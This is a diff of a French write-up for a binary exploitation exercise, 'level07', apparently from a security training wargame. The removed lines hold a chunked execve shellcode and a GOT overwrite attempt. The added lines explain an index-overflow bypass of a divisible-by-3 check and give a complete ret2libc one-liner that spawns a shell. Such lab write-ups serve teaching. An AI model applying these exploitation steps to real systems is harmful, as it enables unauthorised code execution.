@@ -8,109 +8,40 @@ main. Elle ecrit ensuite a l'adresse du buffer + 4 * l'index donne
 par l'utilisateur. On peut peut etre atteindre des adresses
 interessantes grace a ca
 Le buffer est a l'adresse 0xffffd534
-
-main eip a 0xffffd6fc.
-	(0xffffd6fc - 0xffffd534) / 4 = 0x1c8, 456 / 4 = 114. 114 % 3 = 0
-
-store_number eip a 0xffffd50c.
-	(0xffffd50c - 0xffffd534) / 4 = 0xffffffd8, 4294967256 / 4 = 1073741814.
-	1073741814 % 3 = 0
-
-read_number eip a 0xffffd50c
-
-prinft got a 0x804a000.
-	(0x8048a000 - 0xffffd534) / 4 = 134531788 / 4 = 33632947. % 3 = 1
-
-prinft got a 0x8048460.
-	(0x8048460 - 0xffffd534) / 4 = 134524716 / 4 = 33631179. % 3 = 0
-
-get_unum eip a 0xffffd4dc
-	(0xffffd4dc - 0xffffd534) / 4 = 0xffffffa8 / 4 = 4294967208 / 4 = 1073741802
-	1073741802 % 3 = 0
-
-clear_stind eip a 0xffffd4ac
-	(0xffffd4ac - 0xffffd534) / 4 = 0xffffff78 / 4 = 4294967160 / 4 = 1073741790
-	1073741790 % 3 = 0
-
-__libc_start_main eip a 0xffffd76c
-	(0xffffd76c - 0xffffd534) / 4 = 0x238, 568 / 4 = 142. 142 % 3 = 1
-
-Adresse de system 0xf7e6aed0 (4159090384)
-
-Adresse du jump si index % 3 == 0: 0x8048688
-
-Avec env -i addr buff = 0xffffdc54
-
-Je ne trouve pas de solution "simple", toutes les sauvegardes d'eip sont protegees a cause du check du % 3.
-On va essayer d'ecrire un shellcode dans le buffer et de jump dessus en ecrasant l'adresse de got de printf.
-Cependant on peut ecrire seulement sur 2 adresses de suite car a chaque 3e il y a le check du % 3 qui va nous empecher d'ecrire. Cela veut dire qu'on doit decouper notre shellcode en petits bouts de 8 bytes maximum et rajouter a chaque bout un jump vers la suite du shellcode. Donc des bouts de 6 bytes + le jump qui fait 2 bytes.
-Au niveau des index auxquels on ecrit c'est pareil, on doit eviter les % 3 == 0, donc on peut ecrire a 1, 2, 4, 5, 7, 8 etc
-
-Le shellcode que je veux ecrire:
- 8048060: 31 c0                 xor    %eax,%eax
- 8048062: 50                    push   %eax
- 8048063: 68 2f 2f 73 68        push   $0x68732f2f
- 8048068: 68 2f 62 69 6e        push   $0x6e69622f
- 804806d: 89 e3                 mov    %esp,%ebx
- 804806f: 89 c1                 mov    %eax,%ecx
- 8048071: 89 c2                 mov    %eax,%edx
- 8048073: b0 0b                 mov    $0xb,%al
- 8048075: cd 80                 int    $0x80
- 8048077: 31 c0                 xor    %eax,%eax
- 8048079: 40                    inc    %eax
- 804807a: cd 80                 int    $0x80
-
-Je commence a ecrire a l'index 2 et pas 1 car sinon le premier byte n'est pas
-pris en compte. On a donc seulement 2 bytes de dispo avant le premier jump
-En decoupant en morceaux de 6 bytes cela donne:
-00 00 00 00		31 c0 + jump
-50 68 2f 2f		73 68 + jump
-68 2f 62 69		6e 90 + jump. Ici j'ai rajoute un NOP (90) avant le jump pour faciliter le debug
-89 e3 89 c1		89 c2 + jump
-b0 0b cd 80		31 c0 + jump
-40 cd 80
-
-L'opcode d'un jump est 0xeb + la distance a jump, dans notre cas ce sera
-toujours 4 bytes pour sauter l'adresse multiple de 3, soit 0x04.
-Donc avec l'endian un jump de 4 donne 0x04eb
-Ce qui nous donne avec l'endian pour chaque index:
-rien a l'index 1
-0x04ebc031 soit 82559025 en decimal a l'index 2
-rien a l'index 3
-0x2f2f6850 soit 791636048 en decimal a l'index 4
-0x04eb6873 soit 82536563 en decimal a l'index 5
-rien a l'index 6
-0x69622f68 soit 1768042344 en decimal a l'index 7
-0x04eb906e soit 82546798 en decimal a l'index 8
-rien a l'index 9
-0xc189e389 soit 3247039369 en decimal a l'index 10
-0x04ebc289 soit 82559625 en decimal a l'index 11
-rien a l'index 12
-0x80cd0bb0 soit 2160921520 en decimal a l'index 13
-0x04ebc031 soit 82559025 en decimal a l'index 14
-rien a l'index 15
-0x0080cd40 soit 8441152 en decimal a l'index 16
-
-Ce qui donne en python, en rajoutant les instructions "store" a chaque etape:
-python -c 'print "store"'; python -c 'print "82559025"'; python -c 'print "2"';
-python -c 'print "store"'; python -c 'print "791636048"'; python -c 'print "4"';
-python -c 'print "store"'; python -c 'print "82536563"'; python -c 'print "5"';
-python -c 'print "store"'; python -c 'print "1768042344"'; python -c 'print "7"';
-python -c 'print "store"'; python -c 'print "82546798"'; python -c 'print "8"';
-python -c 'print "store"'; python -c 'print "3247039369"'; python -c 'print "10"';
-python -c 'print "store"'; python -c 'print "82559625"'; python -c 'print "11"';
-python -c 'print "store"'; python -c 'print "2160921520"'; python -c 'print "13"';
-python -c 'print "store"'; python -c 'print "82559025"'; python -c 'print "14"';
-python -c 'print "store"'; python -c 'print "8441152"'; python -c 'print "16"';
-
-Enfin, il nous reste a remplacer l'adresse de printf dans la got,
-par celle du shellcode. Comme store_number ecrit a l'adresse du buffer * 4,
-il faut ecrire a l'index (addr_printf - addr_buffer) / 4, soit
-(0x804a000 - 0xffffd534) / 4, soit 33632947
-Comme valeur on met l'adresse du shellcode, 0xffffd53c, soit 4294956348
-En python:
-python -c 'print "store"'; python -c 'print "4294956348"'; python -c 'print "33632947"'
-
-Adresse buffer quand env vide: 0xffffdc74
-Diff avec printf = 33632483
-Adresse du shellcode = 4294958204
+La difficulte de l'exerice reside dans la protection mise en place sur les indexes
+donnes par l'utilisateur. On ne peut pas envoyer un index divisible par 3.
+Par exemple, on a vite envie d'ecrire sur les sauvegardes d'eip des differentes
+fonctions. Mais peu importe la fonction c'est un index divisible par 3.
+Cependant apres la verif, l'index est multiplie par 4 grace a un shift de 2 bits vers la gauche.
+Cela veut dire que toute valeur > a UINT_MAX / 4 va overflow apres la multiplication.
+On peut tester avec gdb en mettant un breakpoint apres le shift.
+En effet, si on met 01000000000000000000000000000000, soit 0x40000000 ou 1073741824,
+on obtient 0 apres le shift. Hors, on ne devrait pas pouvoir mettre 0 avec le
+check du divisible par 3. En jouant avec cela, on peut donc ecrire a tous les 
+index au lieu de 2 sur 3.
+On peut donc finalement ecrire sur la sauvegarde d'eip du main, situee a 
+0xffffd6fc.
+Le buffer ou l'on ecrit est situe a 0xffffd534.
+Il faut donc ecrire a 0xffffd534-0xffffd6fc = 456 bytes apres l'adresse de base
+du buffer.
+Pour cela, soit on donne 456/4 = 114 comme index mais celui-ci est divisble par
+3 donc impossible. Soit une valeur qui donne 456 mais apres l'overflow du au
+bitshift/a la multiplication.  Avec un bitshift calculator online on peut facilement
+trouver. On demarre avec 0x40000000 qui donne 0 puis on augmente.
+0x40000072, soit 1073741938, donnera 456 apres le shift.
+On va ecrire l'adresse de system a cet endroit.
+Adresse de systeme: 0xf7e6aed0, 4159090384
+Il faut ensuite mettre l'adresse de "/bin/sh" 2 adresses plus loin.
+Adresse de "/bin/sh": 0xf7f897ec, 4160264172
+Pour ecrire deux adresses plus loin, soit 0xffffd704 il faut donner un index "normal",
+qui n'overflow pas.
+0xffffd704-0xffffd534 = 464. 464 / 4 = 116. Il faut ecrire a l'index 116
+On entre donc deux fois "store" avec 
+Number: 4159090384
+Index: 1073741938
+Pour ecrire l'adresse de system sur la sauvegarde d'eip du main, puis
+Number: 4160264172
+Index: 116
+Pour ecrire l'adresse de "/bin/sh" deux adresse plus loin.
+On n'a plus qu'a "quit". En gardant stdin ouvert:
+cat <(python -c 'print "store"'; python -c 'print "4159090384"'; python -c 'print "1073741938"'; python -c 'print "store"'; python -c 'print "4160264172"'; python -c 'print "116"'; python -c 'print "quit"') - | ./level07
